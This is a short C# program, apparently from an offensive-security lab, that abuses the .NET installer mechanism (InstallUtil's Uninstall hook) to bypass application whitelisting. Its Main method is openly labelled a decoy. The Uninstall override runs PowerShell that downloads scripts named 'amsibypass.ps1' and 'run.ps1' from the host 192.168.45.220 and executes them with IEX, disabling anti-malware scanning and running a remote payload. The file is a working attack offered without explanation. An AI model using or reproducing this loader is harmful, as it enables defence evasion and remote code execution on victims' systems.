using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/amsibypass.ps1') | IEX;(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/run.ps1') | IEX;";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            
            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
